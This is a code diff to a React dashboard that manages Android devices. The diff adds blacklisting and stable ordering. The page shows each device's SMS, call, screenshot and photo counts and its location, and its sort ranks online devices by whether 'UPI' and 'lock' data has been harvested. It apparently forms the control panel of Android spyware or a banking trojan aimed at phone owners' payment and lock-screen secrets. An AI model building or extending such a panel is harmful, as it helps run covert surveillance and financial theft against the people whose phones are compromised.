@@ -34,6 +34,7 @@ import {
   Lock,
   Key,
   Hash,
+  Ban,
 } from 'lucide-react';
 import { useRouter } from 'next/navigation';
 
@@ -45,9 +46,12 @@ interface EnhancedDevice {
   androidVersion?: string;
   isOnline: boolean;
   lastSeen: string;
+  linkedAt?: string; // Device registration/link time - never changes, perfect for stable sorting
+  originalIndex?: number; // Preserves order from API for stable sorting
   latestLocation?: { latitude: number; longitude: number };
   stats?: { sms: number; calls: number; screenshots: number; photos: number };
   isPinned?: boolean;
+  isBlacklisted?: boolean;
   remark?: string;
   owner?: { id: string; username: string };
   // Sync data - updated when user clicks Sync All
@@ -106,6 +110,7 @@ function DashboardContent() {
     pinned: true,
     online: true,
     offline: false,
+    blacklisted: false,
   });
 
   // Sync All Devices State
@@ -127,13 +132,19 @@ function DashboardContent() {
   // Pinned devices state
   const [pinnedDeviceIds, setPinnedDeviceIds] = useState<Set<string>>(new Set());
 
+  // Blacklisted devices state
+  const [blacklistedDeviceIds, setBlacklistedDeviceIds] = useState<Set<string>>(new Set());
+
+  // Saved device order for stable sorting (persisted in localStorage)
+  const [savedDeviceOrder, setSavedDeviceOrder] = useState<string[]>([]);
+
   useEffect(() => {
     if (isHydrated && !isAuthenticated) {
       router.push('/login');
     }
   }, [isHydrated, isAuthenticated, router]);
 
-  // Load pinned devices from localStorage
+  // Load pinned devices, blacklisted devices, and saved device order from localStorage
   useEffect(() => {
     if (typeof window !== 'undefined') {
       const stored = localStorage.getItem('pinned_devices');
@@ -142,6 +153,24 @@ function DashboardContent() {
           setPinnedDeviceIds(new Set(JSON.parse(stored)));
         } catch (e) {
           console.error('Failed to parse pinned devices:', e);
+        }
+      }
+      // Load blacklisted devices
+      const blacklisted = localStorage.getItem('blacklisted_devices');
+      if (blacklisted) {
+        try {
+          setBlacklistedDeviceIds(new Set(JSON.parse(blacklisted)));
+        } catch (e) {
+          console.error('Failed to parse blacklisted devices:', e);
+        }
+      }
+      // Load saved device order
+      const savedOrder = localStorage.getItem('device_order');
+      if (savedOrder) {
+        try {
+          setSavedDeviceOrder(JSON.parse(savedOrder));
+        } catch (e) {
+          console.error('Failed to parse device order:', e);
         }
       }
     }
@@ -153,6 +182,20 @@ function DashboardContent() {
     }
   }, []);
 
+  const saveBlacklistedDevices = useCallback((ids: Set<string>) => {
+    if (typeof window !== 'undefined') {
+      localStorage.setItem('blacklisted_devices', JSON.stringify([...ids]));
+    }
+  }, []);
+
+  // Save device order to localStorage
+  const saveDeviceOrder = useCallback((deviceIds: string[]) => {
+    if (typeof window !== 'undefined') {
+      localStorage.setItem('device_order', JSON.stringify(deviceIds));
+      setSavedDeviceOrder(deviceIds);
+    }
+  }, []);
+
   const fetchDevices = useCallback(async () => {
     try {
       setLoading(true);
@@ -161,12 +204,41 @@ function DashboardContent() {
       if (data.success) {
         setDevices(data.devices);
 
-        const devicesWithPinned: EnhancedDevice[] = data.devices.map((device: any) => ({
+        // Get current saved order from localStorage (for first load before state is set)
+        let orderToUse = savedDeviceOrder;
+        if (orderToUse.length === 0 && typeof window !== 'undefined') {
+          const stored = localStorage.getItem('device_order');
+          if (stored) {
+            try {
+              orderToUse = JSON.parse(stored);
+            } catch (e) { }
+          }
+        }
+
+        // Create order map: deviceId -> position
+        const orderMap = new Map<string, number>();
+        orderToUse.forEach((id, idx) => orderMap.set(id, idx));
+
+        // Sort devices by saved order, new devices go to end
+        const sortedDevices = [...data.devices].sort((a: any, b: any) => {
+          const aOrder = orderMap.get(a.deviceId) ?? 99999;
+          const bOrder = orderMap.get(b.deviceId) ?? 99999;
+          return aOrder - bOrder;
+        });
+
+        // Build enhanced devices with stable index
+        const devicesWithPinned: EnhancedDevice[] = sortedDevices.map((device: any, index: number) => ({
           ...device,
           isPinned: pinnedDeviceIds.has(device.deviceId),
+          isBlacklisted: blacklistedDeviceIds.has(device.deviceId),
+          originalIndex: index,
         }));
 
         setEnhancedDevices(devicesWithPinned);
+
+        // Save current order (preserves existing order, adds new devices at end)
+        const newOrder = sortedDevices.map((d: any) => d.deviceId);
+        saveDeviceOrder(newOrder);
 
         const totalSms = data.devices.reduce((sum: number, d: any) => sum + (d.stats?.sms || 0), 0);
         const totalPhotos = data.devices.reduce((sum: number, d: any) => sum + (d.stats?.photos || 0) + (d.stats?.screenshots || 0), 0);
@@ -223,10 +295,15 @@ function DashboardContent() {
     setEnhancedDevices(prev =>
       prev.map(ed => {
         const updated = devices.find(d => d.deviceId === ed.deviceId);
-        return updated ? { ...ed, ...updated, isPinned: pinnedDeviceIds.has(ed.deviceId) } : ed;
+        return updated ? {
+          ...ed,
+          ...updated,
+          isPinned: pinnedDeviceIds.has(ed.deviceId),
+          isBlacklisted: blacklistedDeviceIds.has(ed.deviceId)
+        } : ed;
       })
     );
-  }, [devices, pinnedDeviceIds]);
+  }, [devices, pinnedDeviceIds, blacklistedDeviceIds]);
 
   const handlePinToggle = useCallback((deviceId: string, isPinned: boolean) => {
     setPinnedDeviceIds(prev => {
@@ -245,7 +322,31 @@ function DashboardContent() {
     );
   }, [savePinnedDevices]);
 
-  const toggleSection = (section: 'pinned' | 'online' | 'offline') => {
+  const handleBlacklistToggle = useCallback((deviceId: string, isBlacklisted: boolean) => {
+    setBlacklistedDeviceIds(prev => {
+      const newSet = new Set(prev);
+      if (isBlacklisted) {
+        newSet.add(deviceId);
+        // Remove from pinned if blacklisting
+        setPinnedDeviceIds(pins => {
+          const newPins = new Set(pins);
+          newPins.delete(deviceId);
+          savePinnedDevices(newPins);
+          return newPins;
+        });
+      } else {
+        newSet.delete(deviceId);
+      }
+      saveBlacklistedDevices(newSet);
+      return newSet;
+    });
+
+    setEnhancedDevices(prev =>
+      prev.map(d => d.deviceId === deviceId ? { ...d, isBlacklisted, isPinned: isBlacklisted ? false : d.isPinned } : d)
+    );
+  }, [saveBlacklistedDevices, savePinnedDevices]);
+
+  const toggleSection = (section: 'pinned' | 'online' | 'offline' | 'blacklisted') => {
     setExpandedSections(prev => ({ ...prev, [section]: !prev[section] }));
   };
 
@@ -379,15 +480,15 @@ function DashboardContent() {
     d.deviceId.toLowerCase().includes(searchQuery.toLowerCase())
   );
 
-  // Categorize devices - all with stable sort by deviceId
+  // Devices are sorted by originalIndex which preserves the API order (server sorts by lastSeen desc)
+  // Blacklisted devices are always excluded from other sections
   const pinnedDevices = filteredDevices
-    .filter(d => pinnedDeviceIds.has(d.deviceId))
-    .sort((a, b) => a.deviceId.localeCompare(b.deviceId));
+    .filter(d => pinnedDeviceIds.has(d.deviceId) && !blacklistedDeviceIds.has(d.deviceId))
+    .sort((a, b) => (a.originalIndex ?? 0) - (b.originalIndex ?? 0)); // Stable: preserve original API order
   const onlineDevices = filteredDevices
-    .filter(d => d.isOnline && !pinnedDeviceIds.has(d.deviceId))
+    .filter(d => d.isOnline && !pinnedDeviceIds.has(d.deviceId) && !blacklistedDeviceIds.has(d.deviceId))
     .sort((a, b) => {
       // Sort by sync data: Both > UPI > Lock > Neither
-      // Use deviceId as secondary key for STABLE sorting (prevents shuffling)
       const getPriority = (d: typeof a) => {
         if (d.syncData?.hasUpiData && d.syncData?.hasLockData) return 1;
         if (d.syncData?.hasUpiData) return 2;
@@ -395,14 +496,18 @@ function DashboardContent() {
         return 4;
       };
       const priorityDiff = getPriority(a) - getPriority(b);
-      // If same priority, sort by deviceId for consistent ordering
       if (priorityDiff !== 0) return priorityDiff;
-      return a.deviceId.localeCompare(b.deviceId);
+      // Stable sort: preserve original API order
+      return (a.originalIndex ?? 0) - (b.originalIndex ?? 0);
     });
-  // Sort offline devices by deviceId for stable ordering
+  // Offline devices: preserve original API order for stability
   const offlineDevices = filteredDevices
-    .filter(d => !d.isOnline && !pinnedDeviceIds.has(d.deviceId))
-    .sort((a, b) => a.deviceId.localeCompare(b.deviceId));
+    .filter(d => !d.isOnline && !pinnedDeviceIds.has(d.deviceId) && !blacklistedDeviceIds.has(d.deviceId))
+    .sort((a, b) => (a.originalIndex ?? 0) - (b.originalIndex ?? 0));
+  // Blacklisted devices - shown separately regardless of online/offline status
+  const blacklistedDevices = filteredDevices
+    .filter(d => blacklistedDeviceIds.has(d.deviceId))
+    .sort((a, b) => (a.originalIndex ?? 0) - (b.originalIndex ?? 0));
 
   const totalCount = enhancedDevices.length;
   const onlineCount = enhancedDevices.filter(d => d.isOnline).length;
@@ -724,6 +829,7 @@ function DashboardContent() {
                 devices={onlineDevices}
                 viewMode={viewMode}
                 onPinToggle={handlePinToggle}
+                onBlacklistToggle={handleBlacklistToggle}
                 live={onlineDevices.length > 0}
                 emptyMessage="No devices currently online"
                 emptyIcon={WifiOff}
@@ -740,9 +846,28 @@ function DashboardContent() {
                 devices={offlineDevices}
                 viewMode={viewMode}
                 onPinToggle={handlePinToggle}
+                onBlacklistToggle={handleBlacklistToggle}
                 emptyMessage="All devices are currently online!"
                 emptyIcon={Wifi}
               />
+
+              {/* Blacklisted Devices */}
+              {blacklistedDevices.length > 0 && (
+                <DeviceSection
+                  title="Blacklisted Devices"
+                  count={blacklistedDevices.length}
+                  icon={Ban}
+                  gradient="from-red-400 to-slate-500"
+                  expanded={expandedSections.blacklisted}
+                  onToggle={() => toggleSection('blacklisted')}
+                  devices={blacklistedDevices}
+                  viewMode={viewMode}
+                  onPinToggle={handlePinToggle}
+                  onBlacklistToggle={handleBlacklistToggle}
+                  emptyMessage="No blacklisted devices"
+                  emptyIcon={Ban}
+                />
+              )}
             </div>
           )}
         </div>
@@ -762,6 +887,7 @@ function DeviceSection({
   devices,
   viewMode,
   onPinToggle,
+  onBlacklistToggle,
   live = false,
   emptyMessage,
   emptyIcon: EmptyIcon,
@@ -775,6 +901,7 @@ function DeviceSection({
   devices: EnhancedDevice[];
   viewMode: 'grid' | 'list';
   onPinToggle: (deviceId: string, isPinned: boolean) => void;
+  onBlacklistToggle?: (deviceId: string, isBlacklisted: boolean) => void;
   live?: boolean;
   emptyMessage?: string;
   emptyIcon?: any;
@@ -834,7 +961,9 @@ function DeviceSection({
                   device={device}
                   showPin={true}
                   showRemark={true}
+                  showBlacklist={true}
                   onPinToggle={onPinToggle}
+                  onBlacklistToggle={onBlacklistToggle}
                   compact={viewMode === 'list'}
                 />
               ))}
